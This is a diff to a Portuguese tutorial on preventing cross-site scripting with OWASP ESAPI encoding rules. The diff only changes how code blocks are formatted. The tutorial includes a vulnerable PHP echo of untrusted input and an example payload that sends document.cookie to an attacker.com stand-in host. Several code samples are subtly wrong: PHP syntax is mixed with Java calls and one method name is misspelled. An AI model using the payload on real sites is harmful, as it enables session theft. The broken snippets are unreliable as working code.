@@ -51,11 +51,11 @@ de revisão manual do código e teste de penetração manual. A tabela abaixo si
 Todo script que envia para o navegador dados não confiáveis serve de exemplo para este tipo de ataque. Uma única linha 
 de código pode ser responsável pela vulnerabilidade, vejamos este pequeno exemplo:
 
-{% highlight php %}
+```php
 <?php
 echo $_REQUEST("dado_nao_confiavel");
 ?>
-{% endhighlight %}
+```
 
 
 Importante notar que apesar do ataque ser efetuado em uma linguagem client-side, o problema continua sendo da linguagem 
@@ -72,20 +72,20 @@ escrito em cgi denominado "cookie.cgi" se encarregará de receber e armazenar o 
  está preocupado com o ID de sessão de navegação da vítima, com posse dessa informação o atacante poderá criar 
 requisições para o site verdadeiro como um usuário real. Os códigos abaixo ilustram este ataque:
 
-{% highlight php %}
+```php
 <?php
 $creditcard = $_REQUEST("creditcard");
 $page += "<input name='creditcard' type='text'  value='creditcard' >";
 echo $page;
-{% endhighlight %}
+```
 
 O HTML resultante será como o abaixo.
 
-{% highlight html %}
+```html
 '><script>
     document.location='http/www.attacker.com/cgi-bin/cookie.cgi?'%20+document.cookie
 </script>
-{% endhighlight %}
+```
 
 Segundo Williams e Manico (2011) existem 8 regras (numeradas de 0 a 7) para evitar este tipo de vulnerabilidade: 
 
@@ -164,11 +164,11 @@ Este sinais podem (devem) ser trocados pelos indicados na tabela abaixo.
 
 É possível ainda fazer uso da ESAPI com módulo "HTML entity escaping and unescaping" conforme ilustrado no código abaixo.
 
-{% highlight php %}
+```php
 <?php
 $dado_inseguro = request.getParameter( "input" );
 $dado_seguro = $ESAPI->encoder->encodeForHTML($dado_inseguro);
-{% endhighlight %}
+```
 
 
 A __regra de numeração 2__ diz que é preciso codificar os caracteres quando é incluso dados não confiáveis em valores 
@@ -186,11 +186,11 @@ código abaixo e pode ser compreendida da seguinte forma:
 É possível ainda fazer uso da ESAPI com módulo "HTML entity escaping and unescaping" conforme demonstrado no código abaixo.
 Repare que o método chamado difere do método chamado na utilização da ESAPI para a Regra 1.
 
-{% highlight php %}
+```php
 <?php
 $dado_inseguro = request.getParameter( "input" );
 $dado_seguro = $ESAPI->encoder->encodeForHTMLAttribute($dado_inseguro);
-{% endhighlight %}
+```
 
 Esta regra ainda salienta que é preferível utilizar os atributos com as aspas duplas do que com sem as aspas uma vez 
 que atributos sem aspas podem ser facilmente quebrados por caracteres como...
@@ -218,11 +218,11 @@ utilize parâmetros, atribuição à variáveis e principalmente tratadores de e
 
 É possível fazer uso da ESAPI com módulo "HTML entity escaping and unescaping" conforme demonstrado no código abaixo.
 
-{% highlight php %}
+```php
 <?php
 $dado_inseguro = request.getParameter( "input" );
 $dado_seguro   = $ESAPI->encoder->encodeForHTMJavaScript($dado_inseguro);
-{% endhighlight %}
+```
 
 A __regra de numeração 4__ (codificar CSS antes de inserir dados não confiáveis em valores de propriedades de estilos 
 de HTML) diz respeito à situação em que o sistema precisa colocar dados não confiáveis em um estilos CSS. O Importante 
@@ -236,11 +236,11 @@ código HTML abaixo ilustrada os locais que não devem ser colocados dados não 
 
 É possível fazer uso da ESAPI com módulo "HTML entity escaping and unescaping" conforme demonstrado no código abaixo.
 
-{% highlight php %}
+```php
 <?php
 $dado_inseguro = request.getParameter( "input" );
 $dado_seguro   = $ESAPI->encoder->encodeForCSS($dado_inseguro);
-{% endhighlight %}
+```
 
 
 A __regra de numeração 5__ (codificar URL antes de inserir dados não confiáveis em parâmetros de URL) diz respeito à 
@@ -253,16 +253,16 @@ os dados não confiáveis:
 Para esta regra poderá ser feito o uso da ESAPI com módulo "HTML entity escaping and unescaping" conforme demonstrado 
 pelo código abaixo.
 
-{% highlight php %}
+```php
 <?php
 $dado_inseguro = request.getParameter( "input" );
 $dado_seguro   = $ESAPI->encoder->encodeForUrl($dado_inseguro);
-{% endhighlight %}
+```
 
 A regra ainda recomenda que para ser completo o tratamento da URL deve passar por uma validação antes conforme demostrado
 abaixo.
 
-{% highlight php %}
+```php
 <?php
 $userURL    = $_REQUEST("userURL");
 $isValidURL = $ESAPI->validator->isValidInput("URLContext", userURL, "URL", 255, false);
@@ -270,7 +270,7 @@ if ($isValidURL) {
      $userURL = $ESAPI->encoder->encodeForHTMLAttribute($userURL);
      echo "<a href=\"codeFor($userURL)\">link</a>";
 }
-{% endhighlight %}
+```
 
 A __regra de numeração 6__ diz respeito da API AntiSamy, um projeto da OWASP que tem como finalidade garantir que o 
 HTML/CSS fornecido pelo usuário está em conformidade com o sistema web. Esta API foi escrita inicialmente na linguagem 
@@ -292,10 +292,10 @@ tecnologia, por exemplo, é possível fazer um ataque que utiliza-se de código 
 utilizaremos, na ordem, o método `encoderHTML()` da ESAPI para codificar o possível código malicioso escrito em HTML e, 
 em seguida, utilizamos o método `encoderForJs()` da ESAPI conforme demonstrado no código abaixo. (MANICO et al., 2010)
 
-{% highlight php %}
+```php
 <?php
 $dado_seguro = $ESAPI->encoder->encodeForJs(  $ESAPI->encoder->encodeHTML($dado_inseguro)  );
-{% endhighlight %}
+```
 
 Se o subcontexto for, por exemplo, CSS então é preciso utilizar-se do método `encodeForCSS()`.
 
@@ -304,9 +304,9 @@ subcontexto for um atributo de URL, será preciso então utilizar-se do método 
 atributo de uma tag HTML será preciso então utilizar-se do método `encodeForHTMLattr()`. Os exemplos são ilustrados no 
 código abaixo.
 
-{% highlight php %}
+```php
 <?php
 $dado_seguro = $ESAPI->encoder->encodeForJs(  $ESAPI->encoder->encodeForHTMLattr($dado_inseguro)  );
 $dado_seguro = $ESAPI->encoder->encodeForJs(  $ESAPI->encoder->encodeForCSS($dado_inseguro)  );
 $dado_seguro = $ESAPI->encoder->encodeForJs(  $ESAPI->encoder->encodeForURL($dado_inseguro)  );
-{% endhighlight %}
+```
